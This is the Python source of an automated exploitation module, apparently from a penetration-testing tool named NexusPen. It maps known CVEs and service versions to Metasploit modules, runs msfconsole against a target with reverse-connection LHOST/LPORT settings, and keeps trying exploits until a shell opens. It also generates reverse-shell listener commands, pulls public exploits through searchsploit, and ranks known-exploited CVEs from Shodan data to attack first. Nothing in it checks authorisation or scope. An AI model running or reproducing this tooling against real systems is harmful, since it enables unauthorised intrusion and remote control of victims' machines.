#!/usr/bin/env python3
"""
NexusPen - Auto Exploiter Module
================================
Automated vulnerability exploitation.

Matches vulnerabilities to exploits and executes them automatically.
"""

import subprocess
import re
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class ExploitResult:
    """Result of an exploit attempt."""
    exploit_name: str
    target: str
    success: bool
    shell_type: Optional[str] = None
    session_id: Optional[str] = None
    output: Optional[str] = None
    error: Optional[str] = None


class AutoExploiter:
    """
    Automatic vulnerability exploitation.
    Maps CVEs and service versions to known exploits.
    """
    
    # CVE to Metasploit module mapping
    CVE_EXPLOITS = {
        # Windows
        'CVE-2017-0144': 'exploit/windows/smb/ms17_010_eternalblue',
        'CVE-2019-0708': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
        'CVE-2020-0796': 'exploit/windows/smb/smbghost_client_oob',
        'CVE-2020-1472': 'auxiliary/admin/dcerpc/cve_2020_1472_zerologon',
        'CVE-2021-1675': 'exploit/windows/dcerpc/cve_2021_1675_printnightmare',
        'CVE-2021-34527': 'exploit/windows/dcerpc/printnightmare',
        'CVE-2021-42287': 'auxiliary/admin/kerberos/nopac',
        'CVE-2022-26923': 'auxiliary/admin/ldap/chain_delegation_via_esc9',
        
        # Linux
        'CVE-2021-4034': 'exploit/linux/local/cve_2021_4034_pwnkit_lpe',
        'CVE-2022-0847': 'exploit/linux/local/cve_2022_0847_dirtypipe',
        'CVE-2021-3156': 'exploit/linux/local/cve_2021_3156_sudo_heap_overflow',
        
        # Web
        'CVE-2017-5638': 'exploit/multi/http/struts2_content_type_ognl',
        'CVE-2019-11043': 'exploit/multi/http/php_fpm_rce',
        'CVE-2021-44228': 'exploit/multi/http/log4shell_header_injection',
        'CVE-2022-22965': 'exploit/multi/http/spring4shell',
        
        # Apache
        'CVE-2021-41773': 'exploit/multi/http/apache_normalize_path_rce',
        'CVE-2021-42013': 'exploit/multi/http/apache_normalize_path_rce',
        
        # Exchange
        'CVE-2021-26855': 'auxiliary/scanner/http/exchange_proxylogon',
        'CVE-2021-34473': 'exploit/windows/http/exchange_proxyshell_rce',
        
        # VMware
        'CVE-2021-21972': 'exploit/multi/http/vmware_vcenter_uploadova_rce',
        
        # Confluence
        'CVE-2021-26084': 'exploit/multi/http/confluence_ognl_injection',
        'CVE-2022-26134': 'exploit/multi/http/atlassian_confluence_namespace_ognl_injection',
    }
    
    # Service version to exploit mapping
    SERVICE_EXPLOITS = {
        'vsftpd 2.3.4': 'exploit/unix/ftp/vsftpd_234_backdoor',
        'ProFTPD 1.3.3c': 'exploit/unix/ftp/proftpd_133c_backdoor',
        'OpenSSH 7.2p': 'exploit/linux/ssh/sshexec',
        'Apache 2.4.49': 'exploit/multi/http/apache_normalize_path_rce',
        'Apache 2.4.50': 'exploit/multi/http/apache_normalize_path_rce',
        'Tomcat 8': 'exploit/multi/http/tomcat_mgr_deploy',
        'Tomcat 9': 'exploit/multi/http/tomcat_mgr_deploy',
        'Jenkins': 'exploit/multi/http/jenkins_script_console',
        'Elasticsearch': 'exploit/multi/elasticsearch/search_groovy_script',
        'Redis': 'exploit/linux/redis/redis_replication_cmd_exec',
        'MongoDB': 'auxiliary/scanner/mongodb/mongodb_login',
        'PostgreSQL': 'exploit/linux/postgres/postgres_payload',
        'MySQL': 'exploit/multi/mysql/mysql_udf_payload',
        'MSSQL': 'exploit/windows/mssql/mssql_payload',
        'Samba 3': 'exploit/linux/samba/is_known_pipename',
    }
    
    def __init__(self, target: str, lhost: str, lport: int, config: Dict = None):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.config = config or {}
        self.results: List[ExploitResult] = []
    
    def find_exploit_for_cve(self, cve_id: str) -> Optional[str]:
        """Find Metasploit module for a CVE."""
        return self.CVE_EXPLOITS.get(cve_id.upper())
    
    def find_exploit_for_service(self, service: str, version: str = None) -> Optional[str]:
        """Find exploit for a service/version."""
        if version:
            key = f"{service} {version}"
            for pattern, exploit in self.SERVICE_EXPLOITS.items():
                if pattern.lower() in key.lower():
                    return exploit
        
        for pattern, exploit in self.SERVICE_EXPLOITS.items():
            if service.lower() in pattern.lower():
                return exploit
        
        return None
    
    def exploit_cve(self, cve_id: str, options: Dict = None) -> ExploitResult:
        """
        Exploit a specific CVE.
        
        Args:
            cve_id: CVE identifier
            options: Additional Metasploit options
        """
        console.print(f"\n[cyan]üéØ Exploiting {cve_id}...[/cyan]")
        
        exploit_module = self.find_exploit_for_cve(cve_id)
        
        if not exploit_module:
            return ExploitResult(
                exploit_name=cve_id,
                target=self.target,
                success=False,
                error=f"No exploit found for {cve_id}"
            )
        
        return self._run_metasploit_exploit(exploit_module, options)
    
    def exploit_service(self, service: str, version: str = None,
                       options: Dict = None) -> ExploitResult:
        """
        Exploit a vulnerable service.
        
        Args:
            service: Service name
            version: Service version
            options: Additional options
        """
        console.print(f"\n[cyan]üéØ Exploiting {service} {version or ''}...[/cyan]")
        
        exploit_module = self.find_exploit_for_service(service, version)
        
        if not exploit_module:
            return ExploitResult(
                exploit_name=f"{service}/{version}",
                target=self.target,
                success=False,
                error=f"No exploit found for {service}"
            )
        
        return self._run_metasploit_exploit(exploit_module, options)
    
    def _run_metasploit_exploit(self, module: str, options: Dict = None) -> ExploitResult:
        """Run a Metasploit exploit."""
        console.print(f"[yellow]  Using: {module}[/yellow]")
        
        result = ExploitResult(
            exploit_name=module,
            target=self.target,
            success=False
        )
        
        # Build msfconsole resource script
        rc_commands = [
            f"use {module}",
            f"set RHOSTS {self.target}",
            f"set LHOST {self.lhost}",
            f"set LPORT {self.lport}",
        ]
        
        if options:
            for key, value in options.items():
                rc_commands.append(f"set {key} {value}")
        
        rc_commands.extend([
            "set ExitOnSession false",
            "exploit -j -z"
        ])
        
        rc_content = '\n'.join(rc_commands)
        
        # Write resource file
        rc_file = '/tmp/nexuspen_exploit.rc'
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        try:
            cmd = ['msfconsole', '-q', '-r', rc_file]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            output = proc.stdout
            
            if 'session opened' in output.lower() or 'meterpreter' in output.lower():
                result.success = True
                result.shell_type = 'meterpreter' if 'meterpreter' in output.lower() else 'shell'
                
                # Extract session ID
                session_match = re.search(r'session (\d+) opened', output.lower())
                if session_match:
                    result.session_id = session_match.group(1)
                
                console.print(f"[green]‚úì Exploit successful! Session: {result.session_id}[/green]")
            else:
                result.output = output
                console.print("[red]‚úó Exploit failed[/red]")
                
        except subprocess.TimeoutExpired:
            result.error = "Exploit timed out"
            console.print("[yellow]‚ö†Ô∏è Exploit timed out[/yellow]")
        except FileNotFoundError:
            result.error = "msfconsole not found"
            console.print("[red]msfconsole not found[/red]")
        except Exception as e:
            result.error = str(e)
        
        self.results.append(result)
        return result
    
    def auto_exploit(self, vulnerabilities: List[Dict]) -> List[ExploitResult]:
        """
        Automatically exploit a list of vulnerabilities.
        
        Args:
            vulnerabilities: List of vulnerability dicts with 'cve' or 'service' keys
        """
        console.print("\n[bold cyan]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold cyan]")
        console.print("[bold cyan]              AUTO-EXPLOITATION                             [/bold cyan]")
        console.print("[bold cyan]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold cyan]")
        
        results = []
        
        for vuln in vulnerabilities:
            if 'cve' in vuln:
                result = self.exploit_cve(vuln['cve'], vuln.get('options'))
            elif 'service' in vuln:
                result = self.exploit_service(
                    vuln['service'],
                    vuln.get('version'),
                    vuln.get('options')
                )
            else:
                continue
            
            results.append(result)
            
            # Stop if we got a shell
            if result.success and self.config.get('stop_on_shell', True):
                console.print("[green]‚úì Got shell, stopping auto-exploit[/green]")
                break
        
        return results
    
    def display_results(self):
        """Display exploitation results."""
        if not self.results:
            return
        
        table = Table(title="Exploitation Results", show_header=True,
                     header_style="bold magenta")
        table.add_column("Exploit", style="cyan")
        table.add_column("Target", style="white")
        table.add_column("Success", style="green")
        table.add_column("Session", style="yellow")
        
        for result in self.results:
            table.add_row(
                result.exploit_name.split('/')[-1],
                result.target,
                "‚úì" if result.success else "‚úó",
                result.session_id or "-"
            )
        
        console.print(table)


class ManualExploiter:
    """
    Manual exploitation utilities.
    """
    
    def __init__(self, target: str, lhost: str, lport: int):
        self.target = target
        self.lhost = lhost
        self.lport = lport
    
    def generate_listener_command(self, payload_type: str = 'meterpreter') -> str:
        """Generate Metasploit listener command."""
        if payload_type == 'meterpreter':
            payload = 'windows/meterpreter/reverse_tcp'
        elif payload_type == 'shell':
            payload = 'generic/shell_reverse_tcp'
        else:
            payload = payload_type
        
        return f"""msfconsole -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {self.lhost}; set LPORT {self.lport}; exploit -j" """
    
    def nc_listener(self) -> str:
        """Generate netcat listener command."""
        return f"nc -lvnp {self.lport}"
    
    def socat_listener(self) -> str:
        """Generate socat listener command."""
        return f"socat file:`tty`,raw,echo=0 tcp-listen:{self.lport}"
    
    def rlwrap_nc_listener(self) -> str:
        """Generate rlwrap netcat listener for arrow keys."""
        return f"rlwrap nc -lvnp {self.lport}"
    
    def pwncat_listener(self) -> str:
        """Generate pwncat listener command."""
        return f"pwncat -l -p {self.lport}"
    
    def display_all_listeners(self):
        """Display all listener options."""
        console.print("\n[bold cyan]‚ïê‚ïê‚ïê LISTENER COMMANDS ‚ïê‚ïê‚ïê[/bold cyan]")
        console.print(f"\n[yellow]Metasploit Handler:[/yellow]")
        console.print(f"[dim]{self.generate_listener_command()}[/dim]")
        console.print(f"\n[yellow]Netcat:[/yellow]")
        console.print(f"[dim]{self.nc_listener()}[/dim]")
        console.print(f"\n[yellow]Socat (full TTY):[/yellow]")
        console.print(f"[dim]{self.socat_listener()}[/dim]")
        console.print(f"\n[yellow]Rlwrap + Netcat:[/yellow]")
        console.print(f"[dim]{self.rlwrap_nc_listener()}[/dim]")
        console.print(f"\n[yellow]Pwncat:[/yellow]")
        console.print(f"[dim]{self.pwncat_listener()}[/dim]")


class ExploitDB:
    """
    ExploitDB integration for finding public exploits.
    """
    
    @staticmethod
    def search(query: str, exact: bool = False) -> List[Dict]:
        """Search ExploitDB using searchsploit."""
        console.print(f"\n[cyan]üîç Searching ExploitDB: {query}[/cyan]")
        
        exploits = []
        
        cmd = ['searchsploit']
        if exact:
            cmd.append('-e')
        cmd.append(query)
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            for line in result.stdout.split('\n'):
                if '|' in line and '/' in line:
                    parts = [p.strip() for p in line.split('|')]
                    if len(parts) >= 2 and parts[1]:
                        exploits.append({
                            'title': parts[0],
                            'path': parts[1]
                        })
            
            console.print(f"[green]‚úì Found {len(exploits)} exploits[/green]")
            
        except FileNotFoundError:
            console.print("[red]searchsploit not found[/red]")
        
        return exploits
    
    @staticmethod
    def mirror(exploit_id: str) -> Optional[str]:
        """Copy exploit to current directory."""
        try:
            result = subprocess.run(
                ['searchsploit', '-m', exploit_id],
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                console.print(f"[green]‚úì Exploit copied[/green]")
                return result.stdout
                
        except:
            pass
        
        return None
    
    @staticmethod
    def examine(exploit_id: str) -> Optional[str]:
        """Show exploit contents."""
        try:
            result = subprocess.run(
                ['searchsploit', '-x', exploit_id],
                capture_output=True, text=True
            )
            return result.stdout
        except:
            return None


class SmartAutoExploiter:
    """
    Smart auto-exploitation using Shodan CVEDB for real-time CVE intelligence.
    Automatically discovers and prioritizes vulnerabilities.
    """
    
    def __init__(self, target: str, lhost: str, lport: int, config: Dict = None):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.config = config or {}
        self.auto_exploiter = AutoExploiter(target, lhost, lport, config)
        
        # Import Shodan CVEDB
        try:
            from ..common.cve_intel import ShodanCVEDB, SmartVulnScanner
            self.cvedb = ShodanCVEDB()
            self.vuln_scanner = SmartVulnScanner()
            self.cvedb_available = True
        except ImportError:
            self.cvedb = None
            self.vuln_scanner = None
            self.cvedb_available = False
    
    def smart_exploit_service(self, service: str, version: str = None) -> List[ExploitResult]:
        """
        Smart exploitation: lookup CVEs for service, prioritize by KEV/EPSS, then exploit.
        
        Args:
            service: Service name (e.g., "apache", "nginx")
            version: Service version
        """
        console.print("\n[bold red]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold red]")
        console.print("[bold red]          SMART AUTO-EXPLOITATION (Shodan CVE Intel)        [/bold red]")
        console.print("[bold red]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold red]")
        console.print(f"\n[cyan]Target: {self.target}[/cyan]")
        console.print(f"[cyan]Service: {service} {version or ''}[/cyan]")
        
        results = []
        
        if not self.cvedb_available:
            console.print("[yellow]‚ö†Ô∏è Shodan CVEDB not available, using local exploit database[/yellow]")
            result = self.auto_exploiter.exploit_service(service, version)
            return [result] if result else []
        
        # 1. Lookup CVEs using Shodan CVEDB
        console.print("\n[cyan]üîç Phase 1: CVE Intelligence Lookup...[/cyan]")
        cves = self.vuln_scanner.scan_by_service(service, version)
        
        if not cves:
            console.print("[yellow]No CVEs found, trying local database[/yellow]")
            result = self.auto_exploiter.exploit_service(service, version)
            return [result] if result else []
        
        # 2. Prioritize: KEV first, then high CVSS
        console.print("\n[cyan]üéØ Phase 2: Prioritizing exploits...[/cyan]")
        
        kev_cves = [c for c in cves if c.kev]
        critical_cves = [c for c in cves if c.cvss >= 9 and not c.kev]
        high_cves = [c for c in cves if 7 <= c.cvss < 9 and not c.kev]
        
        priority_cves = kev_cves + critical_cves + high_cves
        
        console.print(f"[red]KEV (Known Exploited): {len(kev_cves)}[/red]")
        console.print(f"[red]Critical (CVSS‚â•9): {len(critical_cves)}[/red]")
        console.print(f"[yellow]High (CVSS‚â•7): {len(high_cves)}[/yellow]")
        
        # 3. Attempt exploitation
        console.print("\n[cyan]üí• Phase 3: Attempting exploitation...[/cyan]")
        
        for cve in priority_cves[:5]:  # Try top 5
            console.print(f"\n[yellow]Trying {cve.cve_id} (CVSS: {cve.cvss})...[/yellow]")
            
            result = self.auto_exploiter.exploit_cve(cve.cve_id)
            results.append(result)
            
            if result.success:
                console.print(f"[green]‚úì SUCCESS with {cve.cve_id}![/green]")
                break
        
        return results
    
    def scan_and_exploit(self, services: List[Dict]) -> Dict:
        """
        Scan services for CVEs and automatically exploit.
        
        Args:
            services: List of dicts with 'name' and 'version' keys
        """
        console.print("\n[bold red]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold red]")
        console.print("[bold red]          FULL SMART SCAN & EXPLOIT                         [/bold red]")
        console.print("[bold red]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold red]")
        
        all_results = []
        successful = []
        
        for svc in services:
            name = svc.get('name', '')
            version = svc.get('version')
            
            results = self.smart_exploit_service(name, version)
            all_results.extend(results)
            
            successful.extend([r for r in results if r.success])
            
            # Stop if we got a shell
            if successful and self.config.get('stop_on_shell', True):
                console.print("\n[green]‚úì Got shell! Stopping further exploitation.[/green]")
                break
        
        return {
            'total_attempts': len(all_results),
            'successful': len(successful),
            'results': all_results,
            'sessions': [r.session_id for r in successful if r.session_id]
        }
    
    def get_kev_exploits(self) -> List[str]:
        """
        Get list of Known Exploited Vulnerabilities with available exploits.
        """
        if not self.cvedb_available:
            return []
        
        console.print("\n[cyan]üîç Fetching KEV list with available exploits...[/cyan]")
        
        kev_cves = self.cvedb.get_kev_cves(limit=30)
        
        exploitable = []
        for cve in kev_cves:
            if self.auto_exploiter.find_exploit_for_cve(cve.cve_id):
                exploitable.append(cve.cve_id)
        
        console.print(f"[green]‚úì {len(exploitable)} KEV CVEs have available exploits[/green]")
        
        return exploitable

